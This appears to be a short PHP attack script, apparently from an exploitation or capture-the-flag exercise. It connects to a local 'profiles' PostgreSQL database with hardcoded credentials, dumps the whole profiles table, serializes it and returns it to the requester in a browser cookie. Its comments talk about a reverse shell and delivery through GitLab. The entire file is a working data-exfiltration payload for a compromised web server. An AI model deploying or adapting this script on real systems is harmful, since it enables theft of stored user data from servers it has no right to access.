<?php
// The first 2 lines come directly from a code snippet the user "clave" wrote
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");
$cookie_name =  'yummyCookie';
$output =  pg_fetch_all($result);
// This converts the database rows into strings so we can send them back as a cookie
$serial = serialize($output);
// if we can get a reverse shell, we can print the results to the console
// echo $serial;
// if going directly through GitLab, use the cookie approach
setcookie($cookie_name, $serial, time() + (86400 * 1), '/'); // Cookie lasts for a single day (86400 seconds)
?>